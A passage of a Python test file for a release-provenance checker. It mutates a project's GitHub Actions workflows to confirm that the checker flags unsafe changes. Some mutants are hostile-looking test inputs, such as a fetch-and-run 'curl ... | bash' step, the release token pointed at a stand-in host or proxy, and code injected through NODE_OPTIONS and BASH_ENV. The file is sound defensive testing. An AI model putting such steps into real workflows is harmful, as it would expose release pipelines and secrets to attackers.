"""Tests of check_release_provenance.py (make test-tools).

Most tests are mutants of the real workflows: each changes one workflow's text in one place, which
must occur exactly once (so a mutant never turns silently into a no-op when the workflow changes),
or adds a workflow, and must give exactly the expected problems, each pinned by its rule and what
it says was refused. The accepted mutants record what the check leaves alone on purpose: it reads
no build step.
"""

from __future__ import annotations

import io
import re
import runpy
import shutil
import subprocess
import sys
import tempfile
import unittest
from contextlib import redirect_stderr, redirect_stdout
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

import check_release_provenance as crp

ROOT = crp.ROOT
RELEASE = crp.RELEASE
GIT = shutil.which("git")
# Every workflow, as the repository has it; a mutant changes one of them.
TEXTS = {
    f"{crp.WORKFLOWS}/{path.name}": path.read_text(encoding="utf-8")
    for path in sorted((ROOT / crp.WORKFLOWS).glob("*.yml"))
}
RELEASE_TEXT = TEXTS[RELEASE]
TAG = "${{ needs.release-please.outputs.tag }}"
# A build job's permissions and outputs, as release.yml has them (both builds share the text).
BUILD_READS = "      contents: read # check out the tag; nothing in this job can write\n"
BUILD_HEADER = (
    "    permissions:\n"
    + BUILD_READS
    + "    outputs:\n      artifact-id: ${{ steps.upload.outputs.artifact-id }}\n"
)
# The same, as release 1.4.2 had them: each build attested and attached its own files.
BUILD_HEADER_1_4_2 = (
    "    permissions:\n"
    "      attestations: write # record build provenance\n"
    "      contents: write # upload assets to the release\n"
    "      id-token: write # sign the provenance attestation\n"
)
ATTEST_PIN = re.search(r"actions/attest-build-provenance@([0-9a-f]{40})", RELEASE_TEXT)[1]
DOWNLOAD_PIN = re.search(r"actions/download-artifact@([0-9a-f]{40})", RELEASE_TEXT)[1]
RELEASE_PLEASE_PIN = re.search(r"release-please-action@([0-9a-f]{40})", RELEASE_TEXT)[1]
OTHER_PIN = "0123456789abcdef0123456789abcdef01234567"
VERIFY_END = "              --source-ref refs/heads/main --deny-self-hosted-runners\n"
# How each kind of problem starts, by rule.
TEMPLATE = 'R6: job "{}" differs from the template at '
CHANGE_BOTH = (
    "change PUBLISH_TEMPLATE in tool/github/check_release_provenance.py and the job together"
)
RELEASE_PLEASE = 'R5: job "release-please" differs from the template at '
CHANGE_RELEASE_PLEASE = "change RELEASE_PLEASE_TEMPLATE in tool/github/check_release_provenance.py"
IN_RELEASE = "in release.yml only release-please and the publish jobs write"
ELSEWHERE = "outside release.yml no job may write contents or attestations"
HANDOFF = 'R7: job "{}" must run on its GitHub-hosted runner and hand dist/ to its publish job'
LOOKALIKE = (
    ":1: R2: no workflow but release.yml may have a name that starts with `release.`",
    "gh before 2.102.0 takes it for release.yml under --signer-workflow",
)
# A step's env in the ios job, after which a mutant adds a variable.
IOS_ENV = "          BUILD_NUMBER: ${{ github.run_number }}\n"
# A workflow other than release.yml, with a job named release-please that names the token.
OTHER_RELEASE_PLEASE = f"""\
name: Other
on: workflow_dispatch
permissions:
  contents: read
jobs:
  release-please:
    runs-on: ubuntu-24.04
    steps:
      - uses: googleapis/release-please-action@{RELEASE_PLEASE_PIN}
        with:
          token: ${{{{ secrets.RELEASE_PLEASE_TOKEN }}}}
"""
# A workflow that may sign with an OIDC token and writes nothing else.
SIGNS = """\
name: Sign
on: workflow_dispatch
permissions:
  contents: read
  id-token: write
jobs:
  sign:
    runs-on: ubuntu-24.04
    steps:
      - run: echo sign
"""


def once(text: str, old: str, new: str) -> str:
    count = text.count(old)
    if count != 1:
        raise AssertionError(f"the mutant's text occurs {count} times: {old!r}")
    return text.replace(old, new)


def sub(old: str, new: str):
    """A mutant that changes `old`, which occurs once in the file."""
    return lambda text: once(text, old, new)


def job_span(text: str, job: str) -> tuple[int, int]:
    """Where `job` starts (its key) and ends (the next job's key, or the end of the file)."""
    start = text.index(f"\n  {job}:\n") + 1
    following = re.compile(r"^  [a-z][a-z-]*:\n", re.M).search(text, start + 1)
    return start, following.start() if following else len(text)


def in_job(job: str, old: str, new: str):
    """A mutant that changes `old`, which occurs once in `job`."""

    def mutate(text: str) -> str:
        start, end = job_span(text, job)
        return text[:start] + once(text[start:end], old, new) + text[end:]

    return mutate


def in_job_header(job: str, old: str, new: str):
    """A mutant that changes `old`, which occurs once in `job`'s keys before its steps."""

    def mutate(text: str) -> str:
        start, end = job_span(text, job)
        steps = text.find("    steps:\n", start, end)
        end = steps if steps >= 0 else end
        return text[:start] + once(text[start:end], old, new) + text[end:]

    return mutate


def new_file(text: str):
    """A mutant that adds a workflow (its path is not among the repository's) holding `text`."""
    return lambda _: text


def replace_job(job: str, new: str):
    """A mutant that puts `new` (a job's YAML, its key included) in place of `job`."""

    def mutate(text: str) -> str:
        start, end = job_span(text, job)
        return text[:start] + new + text[end:]

    return mutate


def both(*mutants):
    """A mutant that applies each of `mutants` in turn."""

    def mutate(text: str) -> str:
        for mutant in mutants:
            text = mutant(text)
        return text

    return mutate


def as_in_1_4_2(text: str) -> str:
    """release.yml as release 1.4.2 had it: each build held the write token and the OIDC token,
    and attested, checked and attached its own files; there were no publish jobs."""
    for build, publish in (("artefacts", "publish-artefacts"), ("ios", "publish-ios")):
        start, end = job_span(text, publish)
        job = text[start:end]
        attach = job[job.index("      - id: provenance\n") :].replace(
            " --deny-self-hosted-runners", ""
        )
        text = text[:start] + text[end:]
        start, end = job_span(text, build)
        block = once(text[start:end], BUILD_HEADER, BUILD_HEADER_1_4_2)
        block = block[: block.index("      - id: upload\n")] + attach
        text = text[:start] + block + text[end:]
    return once(
        text,
        "needs: [release-please, publish-artefacts, publish-ios, deploy]",
        "needs: [release-please, artefacts, ios, deploy]",
    )


# Each mutant: the workflow it changes, the change, and its problems in order (none: accepted).
MUTANTS = {
    # Build jobs: they write nothing, and hand dist/ over by artifact id.
    "build: contents write": (
        RELEASE,
        in_job("artefacts", BUILD_READS, "      contents: write\n"),
        [('R2: job "artefacts" holds `contents: write`', IN_RELEASE)],
    ),
    "build: id-token write": (
        RELEASE,
        in_job("ios", BUILD_READS, BUILD_READS + "      id-token: write\n"),
        ['R2: job "ios" holds `id-token: write`'],
    ),
    "build: attestations write": (
        RELEASE,
        in_job("artefacts", BUILD_READS, BUILD_READS + "      attestations: write\n"),
        ['R2: job "artefacts" holds `attestations: write`'],
    ),
    "build: actions write (it could delete the other build's artifact)": (
        RELEASE,
        in_job("ios", BUILD_READS, BUILD_READS + "      actions: write\n"),
        ['R2: job "ios" holds `actions: write`'],
    ),
    "build: statuses write": (
        RELEASE,
        in_job("artefacts", BUILD_READS, BUILD_READS + "      statuses: write\n"),
        ['R2: job "artefacts" holds `statuses: write`'],
    ),
    "build: a value other than read or none counts as a write": (
        RELEASE,
        in_job("ios", BUILD_READS, "      contents: ${{ 'write' }}\n"),
        ["R2: job \"ios\" holds `contents: ${{ 'write' }}`"],
    ),
    "build: write-all": (
        RELEASE,
        in_job("artefacts", "    permissions:\n" + BUILD_READS, "    permissions: write-all\n"),
        ['R1: job "artefacts": set `permissions` as a mapping of scopes or `read-all`'],
    ),
    "build: permissions from an expression": (
        RELEASE,
        in_job(
            "ios",
            "    permissions:\n" + BUILD_READS,
            "    permissions: ${{ fromJSON(vars.PERMISSIONS) }}\n",
        ),
        ['R1: job "ios": set `permissions` as a mapping of scopes or `read-all`'],
    ),
    "build: artefacts on a self-hosted runner": (
        RELEASE,
        in_job("artefacts", "    runs-on: ubuntu-24.04\n", "    runs-on: [self-hosted, linux]\n"),
        [
            (
                HANDOFF.format("artefacts"),
                "it does not run on ubuntu-24.04, its GitHub-hosted runner",
            )
        ],
    ),
    "build: ios on a self-hosted runner": (
        RELEASE,
        in_job("ios", "    runs-on: macos-26\n", "    runs-on: self-hosted\n"),
        [(HANDOFF.format("ios"), "it does not run on macos-26, its GitHub-hosted runner")],
    ),
    # A label that only starts with a GitHub-hosted one names no GitHub-hosted runner, so only a
    # self-hosted runner could take the job: the runner is compared as the whole label.
    "build: artefacts on a label that starts with its runner's": (
        RELEASE,
        in_job("artefacts", "    runs-on: ubuntu-24.04\n", "    runs-on: ubuntu-24.04-builder\n"),
        [
            (
                HANDOFF.format("artefacts"),
                "it does not run on ubuntu-24.04, its GitHub-hosted runner",
            )
        ],
    ),
    "build: ios on a label that starts with its runner's": (
        RELEASE,
        in_job("ios", "    runs-on: macos-26\n", "    runs-on: macos-26-builder\n"),
        [(HANDOFF.format("ios"), "it does not run on macos-26, its GitHub-hosted runner")],
    ),
    "build: an output name with a typo": (
        RELEASE,
        in_job(
            "artefacts",
            "steps.upload.outputs.artifact-id }}",
            "steps.upload.outputs.artifact_id }}",
        ),
        [(HANDOFF.format("artefacts"), "its outputs are not exactly")],
    ),
    "build: the upload pinned by a tag": (
        RELEASE,
        in_job(
            "ios",
            "actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9",
            "actions/upload-artifact@v7",
        ),
        [(HANDOFF.format("ios"), "does not use actions/upload-artifact@<40-hex commit>")],
    ),
    "build: the upload of another folder": (
        RELEASE,
        in_job("artefacts", "          path: dist/\n", "          path: app/build/\n"),
        [(HANDOFF.format("artefacts"), "its upload step's `with.path` is not `dist/`")],
    ),
    "build: the upload of dist/ and another folder": (
        RELEASE,
        in_job(
            "artefacts",
            "          path: dist/\n",
            "          path: |\n            dist/\n            app/\n",
        ),
        [(HANDOFF.format("artefacts"), "its upload step's `with.path` is not `dist/`")],
    ),
    "build: the upload step without its id": (
        RELEASE,
        in_job("ios", "      - id: upload\n        name:", "      - name:"),
        [(HANDOFF.format("ios"), "0 steps with `id: upload`, not one")],
    ),
    "build: a second upload step": (
        RELEASE,
        in_job(
            "artefacts",
            "      - name: Collect artefacts\n",
            "      - id: upload\n        run: echo decoy\n      - name: Collect artefacts\n",
        ),
        [(HANDOFF.format("artefacts"), "2 steps with `id: upload`, not one")],
    ),
    "build: renamed": (
        RELEASE,
        sub("\n  ios:\n", "\n  iphone:\n"),
        ['R7: release.yml has no job "ios", which a publish job needs'],
    ),
    "preflight: id-token write": (
        RELEASE,
        in_job_header(
            "preflight",
            "    environment: release\n",
            "    environment: release\n    permissions:\n      id-token: write\n",
        ),
        [('R2: job "preflight" holds `id-token: write`', IN_RELEASE)],
    ),
    "deploy: the call with contents write": (
        RELEASE,
        in_job("deploy", "      contents: read\n", "      contents: write\n"),
        ['R2: job "deploy" holds `contents: write`'],
    ),
    # release-please, which holds the write token: exactly its template, but for names and timeouts.
    "release-please: id-token write": (
        RELEASE,
        in_job(
            "release-please",
            "      pull-requests: write # open and update the release pull request\n",
            "      pull-requests: write\n      id-token: write\n",
        ),
        [(RELEASE_PLEASE + "permissions.id-token: not in the template", CHANGE_RELEASE_PLEASE)],
    ),
    "release-please: a second step": (
        RELEASE,
        in_job(
            "release-please",
            "          manifest-file: .release-please-manifest.json\n",
            "          manifest-file: .release-please-manifest.json\n      - run: npm ci\n",
        ),
        [RELEASE_PLEASE + "steps: 1 in the template, found 2"],
    ),
    "release-please: a container": (
        RELEASE,
        in_job(
            "release-please",
            "    timeout-minutes: 10\n",
            "    timeout-minutes: 10\n    container: node:22\n",
        ),
        [RELEASE_PLEASE + "container: not in the template"],
    ),
    "release-please: code for node in the job's env": (
        RELEASE,
        in_job(
            "release-please",
            "    timeout-minutes: 10\n",
            "    timeout-minutes: 10\n"
            "    env:\n      NODE_OPTIONS: --import=data:text/javascript,0\n",
        ),
        [RELEASE_PLEASE + "env: not in the template"],
    ),
    "release-please: code for node in its step's env": (
        RELEASE,
        in_job(
            "release-please",
            "        with:\n",
            "        env:\n          NODE_OPTIONS: --import=data:text/javascript,0\n        with:\n",
        ),
        [RELEASE_PLEASE + "steps[0].env: not in the template"],
    ),
    "release-please: the action by a tag": (
        RELEASE,
        in_job(
            "release-please",
            f"googleapis/release-please-action@{RELEASE_PLEASE_PIN}",
            "googleapis/release-please-action@v5",
        ),
        [
            RELEASE_PLEASE + "steps[0].uses: googleapis/release-please-action@<40-hex commit>,"
            " found 'googleapis/release-please-action@v5'"
        ],
    ),
    "release-please: its token sent to another API host": (
        RELEASE,
        in_job(
            "release-please",
            "          config-file: release-please-config.json\n",
            "          config-file: release-please-config.json\n"
            "          github-api-url: https://example.invalid/api\n",
        ),
        [RELEASE_PLEASE + "steps[0].with.github-api-url: not in the template"],
    ),
    "release-please: its token sent through a proxy": (
        RELEASE,
        in_job(
            "release-please",
            "          config-file: release-please-config.json\n",
            "          config-file: release-please-config.json\n"
            "          proxy-server: example.invalid:8080\n",
        ),
        [RELEASE_PLEASE + "steps[0].with.proxy-server: not in the template"],
    ),
    "release-please: another config file": (
        RELEASE,
        in_job(
            "release-please",
            "          config-file: release-please-config.json\n",
            "          config-file: other.json\n",
        ),
        [
            RELEASE_PLEASE + "steps[0].with.config-file: 'release-please-config.json', found"
            " 'other.json'"
        ],
    ),
    "release-please: a self-hosted runner": (
        RELEASE,
        in_job(
            "release-please", "    runs-on: ubuntu-24.04\n", "    runs-on: [self-hosted, linux]\n"
        ),
        [RELEASE_PLEASE + "runs-on: 'ubuntu-24.04', found ['self-hosted', 'linux']"],
    ),
    "release-please: an older tag as its output": (
        RELEASE,
        in_job(
            "release-please",
            "      tag: ${{ steps.release.outputs.tag_name }}\n",
            "      tag: v1.4.0\n",
        ),
        [RELEASE_PLEASE + "outputs.tag: '${{ steps.release.outputs.tag_name }}', found 'v1.4.0'"],
    ),
    "release-please: renamed": (
        RELEASE,
        sub("\n  release-please:\n", "\n  release:\n"),
        [
            'R2: job "release" holds `contents: write`',
            'R2: job "release" holds `issues: write`',
            'R2: job "release" holds `pull-requests: write`',
            "R3: RELEASE_PLEASE_TOKEN at jobs.release.steps[0].with.token",
            'R5: release.yml has no job "release-please"',
        ],
    ),
    # Publish jobs: exactly the template, but for names and timeouts.
    "publish: a step before the download": (
        RELEASE,
        in_job(
            "publish-artefacts",
            "    steps:\n",
            "    steps:\n      - run: curl -fsSL https://example.invalid/x | bash\n",
        ),
        [
            (
                TEMPLATE.format("publish-artefacts") + "steps: 5 in the template, found 6",
                CHANGE_BOTH,
            )
        ],
    ),
    "publish: a self-hosted runner": (
        RELEASE,
        in_job("publish-ios", "    runs-on: ubuntu-24.04\n", "    runs-on: self-hosted\n"),
        [TEMPLATE.format("publish-ios") + "runs-on: 'ubuntu-24.04', found 'self-hosted'"],
    ),
    "publish: no environment": (
        RELEASE,
        in_job("publish-ios", "    environment: release\n", ""),
        [TEMPLATE.format("publish-ios") + "environment: missing; the template has 'release'"],
    ),
    "publish: the environment as a mapping": (
        RELEASE,
        in_job("publish-ios", "    environment: release\n", "    environment: {name: release}\n"),
        [TEMPLATE.format("publish-ios") + "environment: 'release', found {'name': 'release'}"],
    ),
    "publish: a container": (
        RELEASE,
        in_job(
            "publish-ios",
            "    timeout-minutes: 15\n",
            "    timeout-minutes: 15\n    container: ubuntu:24.04\n",
        ),
        [TEMPLATE.format("publish-ios") + "container: not in the template"],
    ),
    "publish: needs another job too": (
        RELEASE,
        in_job(
            "publish-ios",
            "    needs: [release-please, ios]\n",
            "    needs: [release-please, ios, artefacts]\n",
        ),
        [TEMPLATE.format("publish-ios") + "needs: ['release-please', 'ios'], found"],
    ),
    "publish: permissions read-all": (
        RELEASE,
        in_job(
            "publish-ios",
            "    permissions:\n"
            "      attestations: write # record build provenance\n"
            "      contents: write # upload assets to the release\n"
            "      id-token: write # sign the provenance attestation\n",
            "    permissions: read-all\n",
        ),
        [TEMPLATE.format("publish-ios") + "permissions: a mapping, as the template has"],
    ),
    "publish: the download by name": (
        RELEASE,
        in_job(
            "publish-artefacts",
            "          artifact-ids: ${{ needs.artefacts.outputs.artifact-id || 'missing' }}\n",
            "          name: release-android-web-1\n",
        ),
        [
            TEMPLATE.format("publish-artefacts") + "steps[0].with.artifact-ids: missing",
            TEMPLATE.format("publish-artefacts") + "steps[0].with.name: not in the template",
        ],
    ),
    "publish: an empty id allowed": (
        RELEASE,
        in_job("publish-artefacts", " || 'missing' }}", " }}"),
        [
            TEMPLATE.format("publish-artefacts")
            + "steps[0].with.artifact-ids: \"${{ needs.artefacts.outputs.artifact-id || 'missing' }}\""
        ],
    ),
    "publish: the other build's id": (
        RELEASE,
        in_job(
            "publish-ios", "needs.ios.outputs.artifact-id", "needs.artefacts.outputs.artifact-id"
        ),
        [TEMPLATE.format("publish-ios") + "steps[0].with.artifact-ids: "],
    ),
    "publish: a digest mismatch only warns": (
        RELEASE,
        in_job(
            "publish-ios", "          digest-mismatch: error\n", "          digest-mismatch: warn\n"
        ),
        [TEMPLATE.format("publish-ios") + "steps[0].with.digest-mismatch: 'error', found 'warn'"],
    ),
    "publish: with.name added (name is free only at job and step level)": (
        RELEASE,
        in_job(
            "publish-ios",
            "          digest-mismatch: error\n",
            "          digest-mismatch: error\n          name: release-ios-1\n",
        ),
        [TEMPLATE.format("publish-ios") + "steps[0].with.name: not in the template"],
    ),
    "publish: no rmdir": (
        RELEASE,
        in_job("publish-ios", "          rmdir build\n", ""),
        [TEMPLATE.format("publish-ios") + "steps[1].run: "],
    ),
    "publish: every file the build handed over": (
        RELEASE,
        in_job(
            "publish-ios",
            'mv -- build/SHA256SUMS-ios "build/maalik-e-makaan-$TAG-ios-unsigned.ipa" dist/',
            "mv -- build/* dist/",
        ),
        [TEMPLATE.format("publish-ios") + "steps[1].run: "],
    ),
    "publish: the attest action by a tag": (
        RELEASE,
        in_job(
            "publish-ios",
            f"actions/attest-build-provenance@{ATTEST_PIN}",
            "actions/attest-build-provenance@v4",
        ),
        [
            TEMPLATE.format("publish-ios")
            + "steps[2].uses: actions/attest-build-provenance@<40-hex commit>, found"
            " 'actions/attest-build-provenance@v4'"
        ],
    ),
    "publish: the attest action pinned to 40 hex digits and more": (
        RELEASE,
        in_job(
            "publish-ios",
            f"actions/attest-build-provenance@{ATTEST_PIN}",
            f"actions/attest-build-provenance@{ATTEST_PIN}0",
        ),
        [
            TEMPLATE.format("publish-ios")
            + "steps[2].uses: actions/attest-build-provenance@<40-hex commit>, found"
        ],
    ),
    "publish: the attest action of a lookalike owner": (
        RELEASE,
        in_job(
            "publish-ios",
            f"actions/attest-build-provenance@{ATTEST_PIN}",
            f"actionz/attest-build-provenance@{ATTEST_PIN}",
        ),
        [TEMPLATE.format("publish-ios") + "steps[2].uses: "],
    ),
    "publish: verify allows a self-hosted runner": (
        RELEASE,
        in_job("publish-ios", " --deny-self-hosted-runners", ""),
        [TEMPLATE.format("publish-ios") + "steps[3].run: "],
    ),
    "publish: verify swallows a failure": (
        RELEASE,
        in_job("publish-artefacts", VERIFY_END, VERIFY_END.replace("\n", " || true\n")),
        [TEMPLATE.format("publish-artefacts") + "steps[3].run: "],
    ),
    "publish: the upload may fail": (
        RELEASE,
        in_job(
            "publish-ios",
            "      - name: Attach to the release\n",
            "      - name: Attach to the release\n        continue-on-error: true\n",
        ),
        [TEMPLATE.format("publish-ios") + "steps[4].continue-on-error: not in the template"],
    ),
    "publish: the upload in bash without -e": (
        RELEASE,
        in_job(
            "publish-ios",
            "      - name: Attach to the release\n",
            "      - name: Attach to the release\n        shell: bash {0}\n",
        ),
        [TEMPLATE.format("publish-ios") + "steps[4].shell: not in the template"],
    ),
    "publish: BASH_ENV in the job's env": (
        RELEASE,
        in_job(
            "publish-ios",
            f"      TAG: {TAG}\n",
            f"      TAG: {TAG}\n      BASH_ENV: /tmp/x\n",
        ),
        [TEMPLATE.format("publish-ios") + "env.BASH_ENV: not in the template"],
    ),
    "publish: actions write": (
        RELEASE,
        in_job(
            "publish-ios",
            "      id-token: write # sign the provenance attestation\n",
            "      id-token: write\n      actions: write\n",
        ),
        [TEMPLATE.format("publish-ios") + "permissions.actions: not in the template"],
    ),
    "publish: the iOS provenance file named as Android's": (
        RELEASE,
        in_job("publish-ios", "}}-ios.intoto.jsonl", "}}.intoto.jsonl"),
        [TEMPLATE.format("publish-ios") + "steps[3].env.PROVENANCE: "],
    ),
    "publish: the upload of other files too": (
        RELEASE,
        in_job(
            "publish-ios",
            'dist/* --clobber --repo "$GITHUB',
            'dist/* build/* --clobber --repo "$GITHUB',
        ),
        [TEMPLATE.format("publish-ios") + "steps[4].run: "],
    ),
    "publish: renamed": (
        RELEASE,
        sub("\n  publish-ios:\n", "\n  publish-iphone:\n"),
        [
            'R2: job "publish-iphone" holds `attestations: write`',
            'R2: job "publish-iphone" holds `contents: write`',
            'R2: job "publish-iphone" holds `id-token: write`',
            'R6: release.yml has no job "publish-ios"',
        ],
    ),
    "publish: a key twice": (
        RELEASE,
        in_job(
            "publish-ios",
            "    timeout-minutes: 15\n",
            "    timeout-minutes: 15\n    timeout-minutes: 20\n",
        ),
        ["cannot read it: the key 'timeout-minutes' twice in one mapping; GitHub refuses"],
    ),
    "publish: a comment that hides a line from a YAML 1.2 reader": (
        RELEASE,
        in_job(
            "publish-ios",
            "    timeout-minutes: 15\n    environment: release\n",
            "    timeout-minutes: 15 # PyYAML ends this comment here:\u2028"
            "    environment: release\n",
        ),
        [
            "cannot read it: U+2028 is a line break to PyYAML, not to a YAML 1.2 reader, so the"
            " two could see different keys"
        ],
    ),
    "publish: a merge key in env": (
        RELEASE,
        in_job("publish-ios", f"      TAG: {TAG}\n", f"      TAG: {TAG}\n      <<: {{X: y}}\n"),
        [TEMPLATE.format("publish-ios") + "env.<<: not in the template"],
    ),
    "publish: not a mapping": (
        RELEASE,
        replace_job("publish-ios", "  publish-ios: ~\n\n"),
        [TEMPLATE.format("publish-ios") + "the job: a mapping, as the template has"],
    ),
    "publish: steps that are not a list": (
        RELEASE,
        in_job("publish-ios", "    steps:\n", "    steps: ~\n    later:\n"),
        [
            TEMPLATE.format("publish-ios") + "steps: 5 in the template, found no list",
            TEMPLATE.format("publish-ios") + "later: not in the template",
        ],
    ),
    # release.yml's own keys, which reach every publish step.
    "workflow: BASH_ENV in env": (
        RELEASE,
        sub('  JAVA_VERSION: "21"\n', '  JAVA_VERSION: "21"\n  BASH_ENV: /tmp/x\n'),
        ["R4: release.yml's top-level `env` sets 'BASH_ENV'; only FLUTTER_VERSION, JAVA_VERSION"],
    ),
    "workflow: env from an expression": (
        RELEASE,
        sub(
            "  # Equal to ci.yml's; make docs-check checks them.\n"
            "  FLUTTER_VERSION: 3.47.9\n"
            '  JAVA_VERSION: "21"\n',
            "  ${{ fromJSON(vars.RELEASE_ENV) }}\n",
        ),
        ["R4: release.yml's top-level `env` sets '${{ fromJSON(vars.RELEASE_ENV) }}'"],
    ),
    "workflow: a default working directory": (
        RELEASE,
        sub("    shell: bash\n\njobs:", "    shell: bash\n    working-directory: app\n\njobs:"),
        ["R4: release.yml's `defaults` may be `run: {shell: bash}` and nothing else"],
    ),
    "workflow: called by another workflow": (
        RELEASE,
        sub(
            "  workflow_dispatch:\n\npermissions:",
            "  workflow_dispatch:\n  workflow_call:\n\npermissions:",
        ),
        ["R4: release.yml runs on 'workflow_call'; only push and workflow_dispatch"],
    ),
    "workflow: triggers as a list": (
        RELEASE,
        sub("on:\n  push:\n    branches: [main]\n  workflow_dispatch:\n", "on: [push, schedule]\n"),
        ["R4: release.yml runs on 'schedule'"],
    ),
    "workflow: a trigger as text": (
        RELEASE,
        sub("on:\n  push:\n    branches: [main]\n  workflow_dispatch:\n", "on: workflow_call\n"),
        ["R4: release.yml runs on 'workflow_call'"],
    ),
    # Secrets: by name, from the known list; the release-please token in one place.
    "secrets: the release-please token in a build": (
        RELEASE,
        in_job(
            "ios",
            "          BUILD_NUMBER: ${{ github.run_number }}\n",
            "          BUILD_NUMBER: ${{ github.run_number }}\n"
            "          T: ${{ secrets.RELEASE_PLEASE_TOKEN }}\n",
        ),
        [
            (
                "R3: RELEASE_PLEASE_TOKEN at jobs.ios.steps[4].env.T: it can write to the"
                " repository, so only release.yml's jobs.release-please.steps[0].with.token may"
                " name it"
            )
        ],
    ),
    "secrets: the release-please token in another case": (
        RELEASE,
        in_job("ios", IOS_ENV, IOS_ENV + "          T: ${{ SECRETS.release_please_token }}\n"),
        ["R3: RELEASE_PLEASE_TOKEN at jobs.ios.steps[4].env.T"],
    ),
    "secrets: the release-please token in an env key": (
        RELEASE,
        in_job(
            "ios", IOS_ENV, IOS_ENV + '          "T_${{ secrets.RELEASE_PLEASE_TOKEN }}": "1"\n'
        ),
        [
            "R3: the key jobs.ios.steps[4].env.T_${{ secrets.RELEASE_PLEASE_TOKEN }} holds an"
            " expression: this check reads secrets in values only"
        ],
    ),
    "secrets: any expression as a key, in any workflow": (
        f"{crp.WORKFLOWS}/site-refresh.yml",
        sub(
            "          GH_TOKEN: ${{ github.token }}\n",
            "          GH_TOKEN: ${{ github.token }}\n          ${{ github.token }}: x\n",
        ),
        ["R3: the key jobs.latest.steps[0].env.${{ github.token }} holds an expression"],
    ),
    "secrets: the release-please token in another workflow's release-please job": (
        f"{crp.WORKFLOWS}/other.yml",
        new_file(OTHER_RELEASE_PLEASE),
        [
            f"{crp.WORKFLOWS}/other.yml:11: R3: RELEASE_PLEASE_TOKEN at"
            " jobs.release-please.steps[0].with.token: it can write to the repository"
        ],
    ),
    "secrets: a name built by format()": (
        RELEASE,
        in_job(
            "ios",
            IOS_ENV,
            IOS_ENV + "          T: ${{ secrets[format('{0}_{1}', 'RELEASE_PLEASE', 'TOKEN')] }}\n",
        ),
        ["R3: `secrets` at jobs.ios.steps[4].env.T is not followed by `.NAME`"],
    ),
    "secrets: a name built by format(), in capitals": (
        RELEASE,
        in_job(
            "ios",
            IOS_ENV,
            IOS_ENV + "          T: ${{ SECRETS[format('{0}_TOKEN', 'RELEASE_PLEASE')] }}\n",
        ),
        ["R3: `secrets` at jobs.ios.steps[4].env.T is not followed by `.NAME`"],
    ),
    "secrets: a known name followed by a hyphen": (
        RELEASE,
        in_job("ios", IOS_ENV, IOS_ENV + "          T: ${{ secrets.ANDROID_KEY_ALIAS-GH_PAT }}\n"),
        ["R3: secrets.ANDROID_KEY_ALIAS-GH_PAT at jobs.ios.steps[4].env.T is not in KNOWN_SECRETS"],
    ),
    "secrets: all of them in deploy.yml": (
        f"{crp.WORKFLOWS}/deploy.yml",
        sub(
            "        # Uploads the prebuilt output as is; nothing is built on Vercel.\n"
            "        env:\n          VERCEL_TOKEN: ${{ secrets.VERCEL_TOKEN }}\n",
            "        # Uploads the prebuilt output as is; nothing is built on Vercel.\n"
            "        env:\n          VERCEL_TOKEN: ${{ toJSON(secrets) }}\n",
        ),
        ["R3: `secrets` at jobs.web.steps["],
    ),
    "secrets: an unknown one in backup.yml": (
        f"{crp.WORKFLOWS}/backup.yml",
        sub(
            "      SUPABASE_ACCESS_TOKEN: ${{ secrets.SUPABASE_ACCESS_TOKEN }}\n",
            "      SUPABASE_ACCESS_TOKEN: ${{ secrets.GH_PAT }}\n",
        ),
        ["R3: secrets.GH_PAT at jobs."],
    ),
    "secrets: inherited by the site": (
        RELEASE,
        in_job(
            "site",
            "    secrets:\n      VERCEL_TOKEN: ${{ secrets.VERCEL_TOKEN }}\n",
            "    secrets: inherit\n",
        ),
        ['R3: job "site" passes `secrets: inherit`; pass each secret'],
    ),
    "secrets: passed by the site as a list": (
        RELEASE,
        in_job(
            "site",
            "    secrets:\n      VERCEL_TOKEN: ${{ secrets.VERCEL_TOKEN }}\n",
            "    secrets: [VERCEL_TOKEN]\n",
        ),
        ["R3: job \"site\" passes `secrets: ['VERCEL_TOKEN']`; pass each secret"],
    ),
    # Other workflows.
    "roadmap.yml: contents write": (
        f"{crp.WORKFLOWS}/roadmap.yml",
        sub("      contents: read # read .github/roadmap.toml\n", "      contents: write\n"),
        [('R2: job "sync" holds `contents: write`', ELSEWHERE)],
    ),
    "scorecard.yml: attestations write": (
        f"{crp.WORKFLOWS}/scorecard.yml",
        sub(
            "      id-token: write # sign the results published to the Scorecard API\n",
            "      id-token: write\n      attestations: write\n",
        ),
        ['R2: job "analysis" holds `attestations: write`'],
    ),
    "release.yml-sign.yml: a name older gh takes for release.yml": (
        f"{crp.WORKFLOWS}/release.yml-sign.yml",
        new_file(SIGNS),
        [(f"{crp.WORKFLOWS}/release.yml-sign.yml" + LOOKALIKE[0], LOOKALIKE[1])],
    ),
    "release-yml.yml: a name older gh, reading the dot as any character, takes for release.yml": (
        f"{crp.WORKFLOWS}/release-yml.yml",
        new_file(SIGNS),
        [f"{crp.WORKFLOWS}/release-yml.yml" + LOOKALIKE[0]],
    ),
    # Any character, a letter included, not only a hyphen or another non-word character.
    "releaseXyml.yml: a letter in place of the dot, which older gh takes for release.yml too": (
        f"{crp.WORKFLOWS}/releaseXyml.yml",
        new_file(SIGNS),
        [f"{crp.WORKFLOWS}/releaseXyml.yml" + LOOKALIKE[0]],
    ),
    "pr-title.yml: no top-level permissions": (
        f"{crp.WORKFLOWS}/pr-title.yml",
        sub("permissions:\n  pull-requests: read # read the title of the pull request\n", ""),
        [
            (
                f"{crp.WORKFLOWS}/pr-title.yml:1: R1: set the workflow's top-level `permissions`",
                "without it, or with `write-all`, every job may write",
            )
        ],
    ),
    "site-refresh.yml: write-all at the top": (
        f"{crp.WORKFLOWS}/site-refresh.yml",
        sub("permissions:\n  contents: read\n", "permissions: write-all\n"),
        ["R1: set the workflow's top-level `permissions`"],
    ),
    # Accepted: the builds are not read, and the publish jobs' names and pins may change.
    "accepted: a build leaves a process running, sets BASH_ENV and runs gh with its token": (
        RELEASE,
        in_job(
            "artefacts",
            "      - name: Collect artefacts\n",
            "      - run: |\n"
            "          (sleep 600; cp x dist/a.apk) &\n"
            '          echo "BASH_ENV=/tmp/x" >> "$GITHUB_ENV"\n'
            '          bash -co pipefail "$CODE"\n'
            '          gh release upload "$TAG" x --clobber --repo "$GITHUB_REPOSITORY"\n'
            "      - name: Collect artefacts\n",
        ),
        [],
    ),
    "accepted: a build restores a Gradle cache": (
        RELEASE,
        in_job(
            "artefacts",
            "          distribution: temurin\n",
            "          distribution: temurin\n          cache: gradle\n",
        ),
        [],
    ),
